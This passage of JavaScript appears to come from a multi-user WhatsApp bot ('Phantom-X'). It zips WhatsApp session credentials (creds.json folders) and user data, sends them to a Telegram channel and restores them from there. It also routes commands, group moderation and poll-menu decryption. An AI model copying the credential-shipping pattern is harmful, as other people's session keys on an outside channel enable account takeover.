    // files are nice-to-have but Baileys re-syncs them on reconnect.
    const localItems = fs.readdirSync('.', { withFileTypes: true });
    for (const item of localItems) {
      if (item.isDirectory() && (item.name.startsWith('auth_info') || item.name.startsWith('web_auth_') || item.name === 'user_sessions')) {
        const files = fs.readdirSync(item.name);
        if (files.length === 0) continue;

        if (item.name !== 'user_sessions') {
          // Backup the auth folder if it has valid creds.json
          if (!_ph_isAuthComplete(item.name)) {
            const status = _ph_authStatus(item.name);
            console.log(`[backup] ⚠️ Skipping ${item.name} — no usable creds.json`);
            console.log(`[backup]    status: ${JSON.stringify(status)}`);
            continue;
          }
          // Warn (but still backup) if app-state-sync-key files are missing
          // — Baileys will re-sync them on next reconnect
          if (!files.some(f => f.startsWith('app-state-sync-key'))) {
            console.log(`[backup] ⚠️ ${item.name} has creds.json but no app-state keys yet — backing up anyway (Baileys will re-sync)`);
          }
        }

        zip.addLocalFolder(item.name, item.name);
        console.log(`[backup] ✅ Added ${item.name} (${files.length} files)`);
        authFoldersFound++;
      }
    }
    // Backup essential JSON files that must survive redeploys
    // (covers web accounts, linked numbers, poll cache, menu theme, etc.)
    const essentialFiles = [USERS_FILE, LINKED_FILE, SESSION_FILE, GROUP_SETTINGS_FILE, WARNINGS_FILE, WELCOME_FILE, SCHEDULE_FILE, POLL_CACHE_FILE, PERSONA_FILE, 'menu_banner.jpg'];
    let filesAdded = 0;
    for (const f of essentialFiles) {
      if (fs.existsSync(f)) {
        zip.addLocalFile(f);
        console.log(`[backup] Added ${f}`);
        filesAdded++;
      }
    }
    // If there is no usable auth at all, avoid backing up stale session metadata.
    // Keep only durable non-session data such as web user accounts / branding.
    if (authFoldersFound === 0) {
      try {
        const staleSessionFiles = [LINKED_FILE, SESSION_FILE, POLL_CACHE_FILE];
        for (const stale of staleSessionFiles) {
          if (fs.existsSync(stale)) {
            try { fs.unlinkSync(stale); console.log(`[backup] Removed stale session file before upload: ${stale}`); } catch (_) {}
          }
        }
      } catch (_) {}
    }

    // If session files were removed above, rebuild the zip so stale files are not uploaded.
    if (authFoldersFound === 0) {
      const rebuilt = new AdmZip();
      let rebuiltAuth = 0;
      let rebuiltFiles = 0;
      const refreshedItems = fs.readdirSync('.', { withFileTypes: true });
      for (const item of refreshedItems) {
        if (item.isDirectory() && (item.name.startsWith('auth_info') || item.name.startsWith('web_auth_') || item.name === 'user_sessions')) {
          const files = fs.readdirSync(item.name);
          if (files.length === 0) continue;
          if (item.name !== 'user_sessions' && !_ph_isAuthComplete(item.name)) continue;
          rebuilt.addLocalFolder(item.name, item.name);
          rebuiltAuth++;
        }
      }
      for (const f of essentialFiles) {
        if (fs.existsSync(f)) {
          rebuilt.addLocalFile(f);
          rebuiltFiles++;
        }
      }
      authFoldersFound = rebuiltAuth;
      filesAdded = rebuiltFiles;
      zip.deleteFile?.('*');
      const zipBuf2 = rebuilt.toBuffer();
      if (authFoldersFound === 0 && filesAdded === 0) {
        console.log('[backup] No auth folders or data files found');
        return;
      }
      var zipBuf = zipBuf2;
    } else {
      // Only bail if NOTHING would be backed up — a brand-new signup has no auth
      // folder yet but still needs its web_users.json on Telegram to survive redeploy
      if (authFoldersFound === 0 && filesAdded === 0) {
        console.log('[backup] No auth folders or data files found');
        return;
      }
      var zipBuf = zip.toBuffer();
    }
    console.log(`[backup] Zip created: ${zipBuf.length} bytes`);
    const sent = await telegramBot.sendDocument(TELEGRAM_BACKUP_CHANNEL, zipBuf, {
      caption: `🌑 *Phantom-X Full Backup*\n📅 ${new Date().toISOString()}\n📦 ${authFoldersFound} auth folder(s) + ${filesAdded} data file(s)\n— EVENTIDE OMEGA`,
      parse_mode: 'Markdown'
    }, {
      filename: 'auth_backup.zip',
      contentType: 'application/zip'
    });
    console.log(`[backup] Document sent: msg_id=${sent.message_id}`);
    // 3. Pin new backup first
    await telegramBot.pinChatMessage(TELEGRAM_BACKUP_CHANNEL, sent.message_id, { disable_notification: true });
    console.log(`[backup] SUCCESS: pinned msg_id=${sent.message_id}`);

    // 4. Only now remove the previous backup message. If anything above failed,
    // the previous pinned backup remains available for restore.
    if (oldPinnedMessageId && oldPinnedMessageId !== sent.message_id) {
      try {
        await telegramBot.unpinChatMessage(TELEGRAM_BACKUP_CHANNEL, { message_id: oldPinnedMessageId });
      } catch (_) {}
      try {
        await telegramBot.deleteMessage(TELEGRAM_BACKUP_CHANNEL, oldPinnedMessageId);
        console.log(`[backup] Deleted previous backup msg ${oldPinnedMessageId}`);
      } catch (e) {
        console.log(`[backup] Could not delete previous backup ${oldPinnedMessageId}: ${e.message}`);
      }
    }
  } catch (e) { console.error('[backup] FAILED:', e.message); console.error(e); } finally { backupInProgress = false; }
}
async function restoreAuthFromChannel() {
  if (!TELEGRAM_BACKUP_CHANNEL || !TELEGRAM_TOKEN) return false;
  try {
    const chat = await telegramBot.getChat(TELEGRAM_BACKUP_CHANNEL);
    if (!chat.pinned_message || !chat.pinned_message.document) { console.log('[restore] No pinned document'); return false; }
    const fileUrl = await telegramBot.getFileLink(chat.pinned_message.document.file_id);
    const zipBuf = await new Promise((resolve, reject) => {
      https.get(fileUrl, (res) => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve(Buffer.concat(chunks)));
        res.on('error', reject);
      }).on('error', reject);
    });
    const zip = new AdmZip(zipBuf);
    // Extract to temp first, then selectively copy to avoid overwriting good local auth
    const tmpDir = 'restore_tmp_' + Date.now();
    fs.mkdirSync(tmpDir, { recursive: true });
    zip.extractAllTo(tmpDir, true);
    const restoreItems = fs.readdirSync(tmpDir);
    for (const item of restoreItems) {
      const srcPath = path.join(tmpDir, item);
      const destPath = path.join('.', item);
      
      // If it's a directory (auth folders or user_sessions), overwrite local if restored is better
      if (fs.statSync(srcPath).isDirectory()) {
        if (!fs.existsSync(destPath)) fs.mkdirSync(destPath, { recursive: true });
        
        const subFiles = fs.readdirSync(srcPath);
        for (const sf of subFiles) {
          const sfSrc = path.join(srcPath, sf);
          const sfDest = path.join(destPath, sf);
          
          // Overwrite if local file doesn't exist or is smaller (likely incomplete)
          let shouldCopy = !fs.existsSync(sfDest);
          if (!shouldCopy && !fs.statSync(sfSrc).isDirectory()) {
            const srcSize = fs.statSync(sfSrc).size;
            const destSize = fs.statSync(sfDest).size;
            if (srcSize > destSize) shouldCopy = true;
          }
          
          if (shouldCopy) {
            if (fs.statSync(sfSrc).isDirectory()) {
              try { fs.cpSync(sfSrc, sfDest, { recursive: true }); } catch (_) {}
            } else {
              fs.copyFileSync(sfSrc, sfDest);
            }
          }
        }
      } else {
        // For files, overwrite if restored is newer or local is missing
        fs.copyFileSync(srcPath, destPath);
      }
    }
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
    console.log('[restore] Selective restore complete — state synchronized');
    // Reload all in-memory data from the restored files
    loadWebUsers();
    loadLinked();
    loadGroupSettings();
    loadWarnings();
    loadWelcome();
    loadSchedules();
  // Restore schedule timers after boot (they were lost on process restart)
  setTimeout(() => {
    try {
      const now = new Date();
      for (const [gid, times] of Object.entries(scheduleData)) {
        for (const [time, msg] of Object.entries(times)) {
          const [h, m] = time.split(':').map(Number);
          const scheduleId = `${gid}_${time}`;
          if (activeSchedules[scheduleId]) clearInterval(activeSchedules[scheduleId]);
          activeSchedules[scheduleId] = setInterval(() => {
            const n = new Date();
            if (n.getHours() === h && n.getMinutes() === m) {
              // Try to send via any active socket (main or multi-session)
              const sock = currentSock || Object.values(activeSockets).find(s => s?.isConnected && s?.sock)?.sock;
              if (sock) {
                sock.sendMessage(gid, { text: msg }).catch(() => {});
              }
            }
          }, 60000);
        }
      }
      console.log(`[schedules] Restored ${Object.keys(activeSchedules).length} schedule timers`);
    } catch (e) { console.error('[schedules] Restore error:', e.message); }
  }, 15000);
    loadPollCache();
    // loadPersonas() removed — personas now in user_sessions/*.json
    loadSessions();
    console.log('[restore] All data files reloaded into memory');
    return true;
  } catch (e) { 
    console.error('[restore] Failed:', e.message); 
    console.error(e.stack);
    return false; 
  }
}

// ── BAILEYS CORE ────────────────────────────────────────────────────────
let currentSock = null; // legacy
let currentQR = null;
let isConnected = false;

// Multi-user independent sockets (new .pair will NOT kill old ones)
const activeSockets = {}; // { "2348012345678": { sock, isConnected, user, authDir } }

// ── Socket-to-session mapping (for per-session commands like .restart) ──
const socketKeyMap = new WeakMap();


let lastRestoreCtx = null;
let restoreQrDetected = false;

async function handleMessagesUpsert(sock, socketMsgStore, firstConnRef, { messages, type }) {
    try {
      const msg = messages[0];
      const rawKeys = msg?.message ? Object.keys(msg.message).join(',') : 'null';

      if (type !== 'notify' && type !== 'append') return;
      if (!msg.message) return;

      // ── ANTI-REPLAY: Dead simple — only process msgs timestamped AFTER we connected ──
      const msgTs = typeof msg.messageTimestamp === 'object' 
        ? (msg.messageTimestamp?.low || 0) 
        : Number(msg.messageTimestamp || 0);
      
      if (!firstConnRef.time) {
        // Not connected yet — drop silently
        return;
      }
      
      if (msgTs > 0 && msgTs <= firstConnRef.time) {
        console.log(`[skip] Old msg (ts=${msgTs} <= conn=${firstConnRef.time}) from=${msg.key?.remoteJid}`);
        return;
      }

      socketMsgStore.set(msg);
      const rawJid = msg.key.remoteJid;
      let jid = rawJid;

      // ── INCOMING MSG LOG (helps verify which chat is which in Render logs) ──
      // The remoteJid IS the chat the message came from (this is who we reply to).
      // - In DMs: it's the other person's @lid or @s.whatsapp.net
      // - In self-chat: it's the bot's own @s.whatsapp.net or @lid
      // - In groups: it's the group's @g.us (with msg.key.participant = sender)
      // - In channels: it's the channel's @newsletter
      const _msgType = String(msg.key.remoteJid || '').endsWith('@g.us') ? 'group'
                     : String(msg.key.remoteJid || '').endsWith('@newsletter') ? 'channel'
                     : String(msg.key.remoteJid || '').endsWith('@lid') ? 'dm-as-lid'
                     : String(msg.key.remoteJid || '').endsWith('@s.whatsapp.net') ? 'dm-as-pn'
                     : 'unknown';
      console.log(`[inbox] ${_msgType} remoteJid=${rawJid} senderPn=${msg.key?.senderPn || '-'} fromMe=${msg.key.fromMe} id=${msg.key.id}`);

      // Baileys v7 has native LID handling, so reply to the exact chat JID received.
      if (String(rawJid || '').endsWith('@lid')) {
        console.log(`[lid] using native v7 chat jid: ${rawJid}`);
        jid = rawJid;
      }


      // ── ANTILINK / ANTISPAM / ANTIMENTION interceptors ──
      if (String(jid).endsWith('@g.us') && !msg.key.fromMe) {
        const rawText = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
        // Antilink: detect links
        if (getGroupSetting(jid, 'antilink') && /https?:\/\/|chat\.whatsapp\.com|wa\.me/i.test(rawText)) {
          const senderAdm = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
          if (!senderAdm) {
            try {
              await sock.sendMessage(jid, { delete: msg.key });
              await sock.sendMessage(jid, { text: `⚠️ @${(msg.key.participant || msg.key.remoteJid).split('@')[0]}, links are not allowed here.`, mentions: [msg.key.participant || msg.key.remoteJid] });
            } catch (_) {}
          }
        }
        // Antimention: detect mass mentions (>5)
        const mentions = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (getGroupSetting(jid, 'antimention') && mentions.length > 5) {
          const senderAdm = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
          if (!senderAdm) {
            try {
              await sock.sendMessage(jid, { delete: msg.key });
              await sock.sendMessage(jid, { text: `⚠️ @${(msg.key.participant || msg.key.remoteJid).split('@')[0]}, mass mentions are not allowed.`, mentions: [msg.key.participant || msg.key.remoteJid] });
            } catch (_) {}
          }
        }
      }

      let text = (
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message.ephemeralMessage?.message?.conversation ||
        msg.message.ephemeralMessage?.message?.extendedTextMessage?.text ||
        msg.message.viewOnceMessage?.message?.conversation ||
        msg.message.viewOnceMessage?.message?.extendedTextMessage?.text ||
        msg.message.imageMessage?.caption ||
        msg.message.videoMessage?.caption ||
        ''
      ).trim();
      let lower = text.toLowerCase();
      
      // Check if this message is a button/list/interactive response
      const hasButtonResponse = !!(
        msg.message?.interactiveResponseMessage ||
        msg.message?.listResponseMessage ||
        msg.message?.buttonsResponseMessage ||
        msg.message?.templateButtonReplyMessage ||
        msg.message?.viewOnceMessage?.message?.interactiveResponseMessage ||
        msg.message?.viewOnceMessageV2?.message?.interactiveResponseMessage ||
        msg.message?.ephemeralMessage?.message?.interactiveResponseMessage ||
        msg.message?.ephemeralMessage?.message?.listResponseMessage ||
        msg.message?.ephemeralMessage?.message?.buttonsResponseMessage
      );

      // Do not return if it's a poll update OR a button/interactive response
      if (!text && !msg.message?.pollUpdateMessage && !hasButtonResponse) return;

      console.log(`[msg] type=${type} from=${rawJid} replyTo=${jid} fromMe=${msg.key.fromMe} text=${text.slice(0,60)} hasBtn=${hasButtonResponse}`);
      const ownerNum = sock.user?.id ? normalizeNum(sock.user.id.split(':')[0].split('@')[0]) : '';
      const persona = getBotPersonaByOwner(ownerNum);

      // ── Prefix support: normalize custom prefix to '.' internally ──
      const userPrefix = getPrefix(ownerNum);
      if (userPrefix !== '.' && text.startsWith(userPrefix)) {
        text = '.' + text.slice(userPrefix.length);
        lower = text.toLowerCase();
      }

      // If fromMe and text doesn't start with ., it's likely the bot's own reply — skip
      // BUT permit: poll updates, button responses (the paired number clicking a menu button)
      if (msg.key.fromMe && !text.startsWith('.') && !msg.message?.pollUpdateMessage && !hasButtonResponse) return;

      // ── KILL SWITCH: .kill is the ONLY command that works when killed ──
      const senderIsOwner = isOwnerJid(msg.key.participant || msg.key.remoteJid, sock) || msg.key.fromMe;
      console.log(`[flow] after-skip owner=${ownerNum} senderIsOwner=${senderIsOwner} lower=${lower}`);
      if (lower === '.kill' && senderIsOwner) {
        const wasKilled = getUserKilled(ownerNum);
        const nowKilled = !wasKilled;
        setUserKilled(ownerNum, nowKilled);
        await sock.sendMessage(jid, { text: buildOmegaTerminal(
          nowKilled
            ? `   ░▒▓█ *KILL_SWITCH ENGAGED* █▓▒░\n\n   🔴  *STATUS*   →  ALL ACTIVITY HALTED\n   ⛔  *COMMANDS* →  FROZEN\n   ⚠️  *AUTOREACT* → SUSPENDED\n\n   " *The void goes silent.*\n     *Type .kill again to resume.* "`
            : `   ░▒▓█ *KILL_SWITCH RELEASED* █▓▒░\n\n   🟢  *STATUS*   →  SYSTEMS ONLINE\n   ✅  *COMMANDS* →  ACTIVE\n   ⚡  *AUTOREACT* → RESTORED\n\n   " *The void breathes again.*\n     *All systems operational.* "`
        ) }, quotedOpts(msg));
        return;
      }
      if (getUserKilled(ownerNum) && !hasButtonResponse && !msg.message?.pollUpdateMessage) {
        return; // Frozen for this user only — .kill still works
      }

      // ── AUTOREACT: react to messages in target groups/chats ──
      if (text && !text.startsWith('.') && !msg.key.fromMe) {
        const ar = getAutoreact(ownerNum);
        if (ar.enabled) {
          let shouldReact = false;
          if (ar.scope === 'global') {
            shouldReact = true;
          } else if (ar.scope === 'targets' && ar.targets.length > 0) {
            shouldReact = ar.targets.some(t => jid.includes(t) || jid === t);
          }
          if (shouldReact) {
            try { await sock.sendMessage(jid, { react: { text: ar.emoji, key: msg.key } }); } catch (_) {}
          }
        }
      }

      // ── MODE GATE: In private mode, only the owner can use commands ──
      const currentMode = getSessionMode(ownerNum);
      console.log(`[flow] mode=${currentMode} senderIsOwner=${senderIsOwner} → ${(currentMode === 'private' && !senderIsOwner && text.startsWith('.')) ? 'BLOCKED ❌' : 'ALLOWED ✅'}`);
      if (currentMode === 'private' && !senderIsOwner && text.startsWith('.')) {
        console.log(`[mode] ⛔ Private mode — blocked ${msg.key.participant || msg.key.remoteJid} from using ${text.slice(0,20)}`);
        return; // Silently ignore — don't even tell them
      }

      // ── Alias resolution: check if the command has a per-session alias ──
      if (lower.startsWith('.') && senderIsOwner) {
        const cmdWord = lower.split(/\s+/)[0].slice(1); // e.g. "m" from ".m"
        const resolved = resolveAlias(ownerNum, cmdWord);
        if (resolved !== cmdWord) {
          // Replace the alias with the original command in both text and lower
          const rest = text.slice(text.indexOf(' ') === -1 ? text.length : text.indexOf(' '));
          text = '.' + resolved + rest;
          lower = text.toLowerCase();
          console.log(`[alias] Resolved .${cmdWord} → .${resolved}`);
        }
      }

      if (lower.startsWith(".")) {
        await sendReaction(sock, jid, msg.key, "⚡");
      }

      if (lower.startsWith('.pair')) {
        const parts = text.trim().split(/\s+/);
        const number = parts[1] ? parts[1].replace(/\+/g, '').replace(/\s/g, '') : '';
        if (!number || !/^\d{10,15}$/.test(number)) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal('Usage: .pair <full number with country code>\nExample: .pair 2348012345678\n\nOr use Telegram: /pair <number>\n\nUse .relink to restart if pairing fails.') }, quotedOpts(msg));
          return;
        }
        // MULTI-USER MODE: removed 'already paired' guard (isConnected check).
        // requestPairingCode supports linking millions of additional phones.
        await sock.sendMessage(jid, { text: buildOmegaTerminal('🔄 Starting fresh pairing...\nPlease wait 15-20 seconds.') }, quotedOpts(msg));
        startBot(number, null, 'pair').catch(console.error);
        return;
      }

      if (lower === '.relink') {
        await sock.sendMessage(jid, { text: buildOmegaTerminal('🔄 Clearing session and restarting...\nPlease wait 15-20 seconds.') }, quotedOpts(msg));
        try { sock.end(new Error('relink')); } catch (_) {}
        currentSock = null; clearAuth(); clearReconnectTimer(); isPairing = false;
        setTimeout(() => startBot(null, null, 'relink').catch(console.error), 4000);
        return;
      }

      if (lower === '.telegram.pair') {
        const reply = buildOmegaTerminal(TELEGRAM_TOKEN ? 'Telegram bridge active. Use /pair <number> there.' : 'No TELEGRAM_TOKEN set.');
        await sock.sendMessage(jid, { text: reply }, quotedOpts(msg));
        return;
      }

      if (lower.startsWith('.persona ')) {
        const p = lower.split(' ')[1];
        if (['eclipse', 'astraea'].includes(p)) {
          setBotPersonaByOwner(ownerNum, p);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(`Persona: *${p.toUpperCase()}*\n${eclipseSay('ping', p)}`) }, quotedOpts(msg));
        }
        return;
      }

      if (['.menu', '.eclipse', '.astraea', '.phantom'].includes(lower)) {
        let p = persona;
        if (lower.includes('astraea')) p = 'astraea';
        if (lower.includes('eclipse') || lower.includes('phantom')) p = 'eclipse';
        // Check if SENDER is dev (not the chat JID — in groups, jid is the group, not the sender)
        const senderForDev = msg.key.participant || msg.key.remoteJid;
        const dev = isDevJid(senderForDev) || (msg.key.fromMe && isDevJid(sock.user?.id || ''));
        await sendPersonaMenu(sock, jid, p, 'loading', dev);
        return;
      }

      // Handle button / list / interactive responses (all 4 WhatsApp response shapes)
      let buttonId = '';
      // Path 1: newer clients — interactiveResponseMessage (native_flow)
      if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
        try {
          const params = JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
          buttonId = params.id || '';
          console.log(`[button-detect] Path 1 (nativeFlow): id="${buttonId}"`);
        } catch (e) {}
      }
      // Path 2: legacy WhatsApp Web — listResponseMessage
      if (!buttonId && msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId) {
        buttonId = msg.message.listResponseMessage.singleSelectReply.selectedRowId;
        console.log(`[button-detect] Path 2a (listResponse selectedRowId): id="${buttonId}"`);
      }
      if (!buttonId && msg.message?.listResponseMessage?.title) {
        buttonId = msg.message.listResponseMessage.title;
        console.log(`[button-detect] Path 2b (listResponse title): id="${buttonId}"`);
      }
      // Path 3: standard buttonsResponseMessage (most clients)
      if (!buttonId && msg.message?.buttonsResponseMessage?.selectedButtonId) {
        buttonId = msg.message.buttonsResponseMessage.selectedButtonId;
        console.log(`[button-detect] Path 3a (buttonsResponse selectedButtonId): id="${buttonId}"`);
      }
      if (!buttonId && msg.message?.buttonsResponseMessage?.selectedDisplayText) {
        buttonId = msg.message.buttonsResponseMessage.selectedDisplayText;
        console.log(`[button-detect] Path 3b (buttonsResponse selectedDisplayText): id="${buttonId}"`);
      }
      // Path 4: legacy templateButtonReplyMessage
      if (!buttonId && msg.message?.templateButtonReplyMessage?.selectedId) {
        buttonId = msg.message.templateButtonReplyMessage.selectedId;
        console.log(`[button-detect] Path 4 (templateButton selectedId): id="${buttonId}"`);
      }
      // Path 5: viewOnce wrapped interactiveResponseMessage
      if (!buttonId && msg.message?.viewOnceMessage?.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
        try {
          const params = JSON.parse(msg.message.viewOnceMessage.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
          buttonId = params.id || '';
          console.log(`[button-detect] Path 5 (viewOnce nativeFlow): id="${buttonId}"`);
        } catch (e) {}
      }
      // Path 6: viewOnceMessageV2 wrapped interactiveResponseMessage
      if (!buttonId && msg.message?.viewOnceMessageV2?.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
        try {
          const params = JSON.parse(msg.message.viewOnceMessageV2.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
          buttonId = params.id || '';
          console.log(`[button-detect] Path 6 (viewOnceV2 nativeFlow): id="${buttonId}"`);
        } catch (e) {}
      }
      // Path 7: ephemeralMessage wrapped responses
      if (!buttonId && msg.message?.ephemeralMessage?.message) {
        const inner = msg.message.ephemeralMessage.message;
        if (inner.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
          try {
            const params = JSON.parse(inner.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
            buttonId = params.id || '';
            console.log(`[button-detect] Path 7a (ephemeral nativeFlow): id="${buttonId}"`);
          } catch (e) {}
        }
        if (!buttonId && inner.listResponseMessage?.singleSelectReply?.selectedRowId) {
          buttonId = inner.listResponseMessage.singleSelectReply.selectedRowId;
          console.log(`[button-detect] Path 7b (ephemeral listResponse): id="${buttonId}"`);
        }
        if (!buttonId && inner.buttonsResponseMessage?.selectedButtonId) {
          buttonId = inner.buttonsResponseMessage.selectedButtonId;
          console.log(`[button-detect] Path 7c (ephemeral buttonsResponse): id="${buttonId}"`);
        }
      }

      if (buttonId && buttonId.startsWith('menu_')) {
        console.log(`[button] ✅ Routing menu button: ${buttonId} from ${jid}`);
        await handleMenuButton(sock, jid, msg, buttonId);
        return;
      }
      // If we detected a button but it's not a menu_ button, log it
      if (buttonId) {
        console.log(`[button] Non-menu button detected: "${buttonId}" from ${jid}`);
      }

      // ── HANDLE POLL VOTES (Business account .menu) — POLL FIX v3 ──
      if (msg.message?.pollUpdateMessage) {
        try {
          const pollUpdate = msg.message.pollUpdateMessage;
          const pollCreationKey = pollUpdate.pollCreationMessageKey;
          if (!pollCreationKey?.id) return;

          // Comprehensive diagnostic logging
          console.log(`[poll-vote] ═══════════════════════════════════════════`);
          console.log(`[poll-vote] 📩 Poll vote received!`);
          console.log(`[poll-vote]   vote.fromMe     = ${msg.key.fromMe}`);
          console.log(`[poll-vote]   vote.remoteJid  = ${msg.key.remoteJid}`);
          console.log(`[poll-vote]   vote.participant = ${msg.key.participant || 'undefined'}`);
          console.log(`[poll-vote]   vote.senderPn   = ${msg.key.senderPn || 'undefined'}`);
          console.log(`[poll-vote]   poll.id         = ${pollCreationKey.id}`);
          console.log(`[poll-vote]   poll.fromMe     = ${pollCreationKey.fromMe}`);
          console.log(`[poll-vote]   poll.remoteJid  = ${pollCreationKey.remoteJid || 'undefined'}`);
          console.log(`[poll-vote]   poll.participant = ${pollCreationKey.participant || 'undefined'}`);
          console.log(`[poll-vote]   hasVoteData     = ${!!pollUpdate.vote}`);
          console.log(`[poll-vote]   cacheKeys       = [${Object.keys(pollCreationCache).join(', ')}]`);
          console.log(`[poll-vote]   pollCreationCache keys: ${Object.keys(pollCreationCache).length}`);
          console.log(`[poll-vote]   meIdPN          = ${sock.user?.id || 'unknown'}`);
          console.log(`[poll-vote]   meIdLID         = ${sock.user?.lid || sock.authState?.creds?.me?.lid || 'unknown'}`);

          let mappedId = '';

          // 1. Get cached poll info (either from pollCreationCache or lastMenuPoll)
          let cached = pollCreationCache[pollCreationKey.id];
          // pollCreationCache only (multi-user safe)

          // If this isn't one of our menu polls, skip
          if (!cached) {
            console.log(`[poll-vote] ⚠️ Poll ${pollCreationKey.id} not in cache, ignoring`);
            return;
          }
          console.log(`[poll-vote] ✅ Found poll in cache — options=${cached.options?.length}, hasSecret=${!!cached.secretHex}`);

          let pollSecretHex = null;
          let pollOptions = [];
          let pollIds = [];

          if (cached) {
            if (cached.secretHex) {
              pollSecretHex = cached.secretHex;
              pollOptions = cached.options || [];
              pollIds = cached.ids || [];
            } else if (cached.secret && Buffer.isBuffer(cached.secret)) {
              pollSecretHex = cached.secret.toString('hex');
              pollOptions = cached.options || [];
              pollIds = cached.ids || [];
            }
          }

          // If we didn't find specific options/ids, use default menu structure
          if (!pollOptions || pollOptions.length === 0) {
            const r = [
              { title: '👑 Owner Menu', id: 'menu_owner' },
              { title: '⚙️ Config Menu', id: 'menu_config' },
              { title: '📊 System Menu', id: 'menu_system' },
              { title: '👥 Group Menu', id: 'menu_group' },
              { title: '🎮 Fun Menu', id: 'menu_fun' },
              { title: '🐞 Bug Menu', id: 'menu_bug' },
              { title: '🔧 Utility Menu', id: 'menu_utility' },
              { title: '🔴 Architect Menu', id: 'menu_dev' }
            ];
            pollOptions = r.map((x, i) => `╰┈➤ [ ${i + 1}. ${x.title} ]`);
            pollIds = r.map(x => x.id);
          }

          // POLL FIX: Log diagnostic info for debugging
          console.log(`[poll-menu] 📊 Vote received — pollId=${pollCreationKey.id}, fromMe=${pollCreationKey.fromMe}, cached=${!!cached}, secretLen=${pollSecretHex ? pollSecretHex.length : 0}, options=${pollOptions.length}`);

          // POLL FIX: Attempt Decryption with LID/PN JID brute-force (fixes WhatsApp E2EE issue)
          if (pollUpdate.vote && pollSecretHex) {
            try {
              const { decryptPollVote, jidNormalizedUser } = require('@whiskeysockets/baileys');
              const crypto = require('crypto');
              const rawSecretBuffer = Buffer.from(pollSecretHex, 'hex');

              // POLL FIX v2: Build all possible JID combinations for creator AND voter
              // WhatsApp encrypts poll votes with creator=LID, voter=PN
              // But sometimes it's creator=PN, voter=PN (depends on WA version/client)
              const meIdPN = sock.user?.id ? jidNormalizedUser(sock.user.id) : '';
              // Try multiple sources for the LID (Baileys stores it in different places)
              const rawLid = sock.user?.lid || sock.authState?.creds?.me?.lid || '';
              const meIdLID = rawLid ? jidNormalizedUser(rawLid) : '';

              // ── VOTER JID FIX v3 ──
              // The poll decryption key is derived from both creator + voter JIDs.
              // We must try all possible JID formats for the voter.
              //
              // In groups: msg.key.participant has the voter's JID (for other people)
              //            but when fromMe=true, participant is undefined and remoteJid is the GROUP JID
              // In DMs: participant is always undefined, remoteJid is the chat partner
              //         but when fromMe=true, the voter is the bot itself
              //         AND remoteJid may be in LID format on newer WhatsApp
              const voterJidCandidates = [];
              if (msg.key.fromMe) {
                // Bot's own number voted
                if (meIdPN) voterJidCandidates.push(meIdPN);
                if (meIdLID) voterJidCandidates.push(meIdLID);
              } else if (msg.key.participant) {
                // Group: other person voted, participant has their JID
                voterJidCandidates.push(jidNormalizedUser(msg.key.participant));
                // Also try senderPn (LID groups provide the PN separately)
                if (msg.key.senderPn) voterJidCandidates.push(jidNormalizedUser(msg.key.senderPn));
              } else {
                // DM: other person voted
                const remoteNorm = jidNormalizedUser(msg.key.remoteJid);
                voterJidCandidates.push(remoteNorm);
                // If remoteJid is LID, also try the senderPn field (if Baileys provides it)
                if (msg.key.senderPn) {
                  voterJidCandidates.push(jidNormalizedUser(msg.key.senderPn));
                }
              }
              // Deduplicate
              const uniqueVoters = [...new Set(voterJidCandidates)];

              // ── CREATOR JID FIX v4 ──
              // The poll is in our pollCreationCache, so WE (the bot) created it.
              // In DMs, pollCreationKey.fromMe can be FALSE even though the bot sent the poll
              // (WhatsApp uses the other person's LID as the chat key in DMs).
              // So: ALWAYS try the bot's own LID and PN as creator candidates.
              // Also try whatever pollCreationKey says, as a last resort.
              const creatorJidCandidates = [];
              if (meIdLID) creatorJidCandidates.push(meIdLID);  // Bot's LID (current WA behavior)
              if (meIdPN) creatorJidCandidates.push(meIdPN);    // Bot's PN fallback
              // Also try the JID from pollCreationKey in case it's someone else's poll somehow
              const creationKeyJid = jidNormalizedUser(pollCreationKey.participant || pollCreationKey.remoteJid || '');
              if (creationKeyJid && !creatorJidCandidates.includes(creationKeyJid)) {
                creatorJidCandidates.push(creationKeyJid);
              }

              const uniqueCreators = [...new Set(creatorJidCandidates)];
              console.log(`[poll-menu] 🔑 Trying decryption — creators=[${uniqueCreators.join(', ')}] voters=[${uniqueVoters.join(', ')}] fromMe=${msg.key.fromMe}`);

              let decrypted = null;
              let decryptSuccess = false;

              // POLL FIX v3: Try every combination of creator × voter JID until one works
              for (const creatorJid of uniqueCreators) {
                for (const voterJid of uniqueVoters) {
                  try {
                    decrypted = decryptPollVote(
                      pollUpdate.vote,
                      {
                        pollEncKey: rawSecretBuffer,
                        pollCreatorJid: creatorJid,
                        pollMsgId: pollCreationKey.id,
                        voterJid: voterJid
                      }
                    );
                    if (decrypted && decrypted.selectedOptions && decrypted.selectedOptions.length > 0) {
                      decryptSuccess = true;
                      console.log(`[poll-menu] ✅ Decryption succeeded with creator=${creatorJid}, voter=${voterJid}`);
                      break;
                    }
                  } catch (innerErr) {
                    console.log(`[poll-menu] ❌ Attempt failed creator=${creatorJid} voter=${voterJid}: ${innerErr.message}`);
                  }
                }
                if (decryptSuccess) break;
              }

              // POLL FIX: Match the selected option hash to our poll options
              if (decryptSuccess && decrypted.selectedOptions.length > 0) {
                const selectedHash = Buffer.from(decrypted.selectedOptions[0]).toString('hex');

                for (let i = 0; i < pollOptions.length; i++) {
                  const optHash = crypto.createHash('sha256').update(Buffer.from(pollOptions[i])).digest('hex');
                  if (selectedHash === optHash) {
